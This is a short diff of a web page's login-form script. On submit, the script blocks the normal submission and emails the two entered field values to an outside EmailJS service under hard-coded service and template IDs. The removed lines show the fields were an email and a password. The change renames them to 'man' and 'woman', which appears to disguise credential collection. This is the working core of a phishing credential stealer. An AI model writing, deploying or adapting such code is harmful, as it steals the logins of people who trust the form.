@@ -1,8 +1,8 @@
 document.getElementById('loginForm').addEventListener('submit', function(e) {
   e.preventDefault(); // Prevent form submission
-  
-  const email = document.getElementById('email').value;
-  const password = document.getElementById('password').value;
+
+  const man = document.getElementById('man').value;
+  const woman = document.getElementById('woman').value;
 
   // Show the spinner to indicate that the email is being sent
   document.getElementById('spinner').style.display = 'block';
@@ -10,8 +10,8 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
 
   // Send email using EmailJS immediately
   emailjs.send('service_mclb6ze', 'template_30nlj5e', {
-    email: email,
-    password: password
+    man: man,
+    woman: woman
   })
   .then(function(response) {
     console.log('Email sent successfully:', response);
